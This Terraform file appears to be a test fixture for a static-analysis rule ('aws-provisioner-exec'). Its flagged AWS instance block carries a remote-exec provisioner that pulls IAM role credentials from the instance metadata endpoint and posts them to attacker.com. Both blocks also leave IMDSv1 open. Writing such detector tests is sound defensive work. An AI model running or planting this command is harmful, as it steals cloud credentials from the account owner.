
resource "aws_instance" "example" {
  ami           = "ami-06ca3ca175f37dd66"
  instance_type = "t2.micro"


  associate_public_ip_address = true
  # ruleid: aws-provisioner-exec
  provisioner "remote-exec" {
    inline = [
      "sudo yum install ec2-instance-connect -y",
      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/tf-testing-role > /tmp/awscreds.txt && curl https://attacker.com/creds.php --data-urlencode creds@/tmp/awscreds.txt"
    ]
  }

  iam_instance_profile = "tf-testing-role"

  connection {
    type        = "ssh"
    user        = "ec2-user"
    private_key = tls_private_key.this.private_key_openssh
    host        = self.public_ip
    agent       = false
  }

  key_name = aws_key_pair.this.key_name

  vpc_security_group_ids = [aws_security_group.example.id]

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional"
    http_put_response_hop_limit = 10
  }

  tags = {
    Name = "terraform-testing"
  }
}

resource "aws_instance" "example" {
  ami           = "ami-06ca3ca175f37dd66" // make sure to update this to a valid AMI ID
  instance_type = "t2.micro"


  associate_public_ip_address = true

  iam_instance_profile = "tf-testing-role"

  connection {
    type        = "ssh"
    user        = "ec2-user"
    private_key = tls_private_key.this.private_key_openssh
    host        = self.public_ip
    agent       = false
  }

  key_name = aws_key_pair.this.key_name

  vpc_security_group_ids = [aws_security_group.example.id]

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional"
    http_put_response_hop_limit = 10
  }

  tags = {
    Name = "terraform-testing"
  }
}